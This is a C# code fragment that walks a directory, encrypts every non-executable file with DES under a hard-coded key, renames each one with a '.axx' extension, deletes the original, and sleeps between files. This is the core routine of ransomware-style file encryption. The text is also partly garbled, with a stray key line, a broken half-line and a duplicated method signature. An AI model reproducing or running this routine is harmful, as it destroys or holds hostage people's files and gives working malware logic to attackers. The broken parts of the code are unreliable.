string key = "R?\n??i??";
private static void EncryptDir(string d,int mili)
        {
            DirectoryInfo dirtoencrypt = new DirectoryInfo(d);
            FileInfo[] file;
            file = dirtoencrypt.GetFiles();
            foreach (FileInfo currentFile in file)
            {
                if (currentFile.Extension.ToLower() != ".exe")
                {
                    string key = "R?\n??i??";
                    EncryptFile(currentFile.FullName, currentFile.FullName + ".axx", key);
                    File.Delete(currentFile.FullName);
                   Thread.Sleep(mili);
                }
            }
        }
        static void EncryptFile(string sInputFilename, \
static void EncryptFile(string sInputFilename, string sOutputFilename, string sKey)
        {
            FileStream fsInput = new FileStream(sInputFilename,
             FileMode.Open,
             FileAccess.Read);
            FileStream fsEncrypted = new FileStream(sOutputFilename,
               FileMode.Create,
               FileAccess.Write);
            DESCryptoServiceProvider DES = new DESCryptoServiceProvider();
            DES.Key = ASCIIEncoding.ASCII.GetBytes(sKey);
            DES.IV = ASCIIEncoding.ASCII.GetBytes(sKey);
            ICryptoTransform desencrypt = DES.CreateEncryptor();
            CryptoStream cryptostream = new CryptoStream(fsEncrypted,
               desencrypt,
               CryptoStreamMode.Write);
            byte[] bytearrayinput = new byte[fsInput.Length];
            fsInput.Read(bytearrayinput, 0, bytearrayinput.Length);
            cryptostream.Write(bytearrayinput, 0, bytearrayinput.Length);
            cryptostream.Close();
            fsInput.Close();
            fsEncrypted.Close();
        }
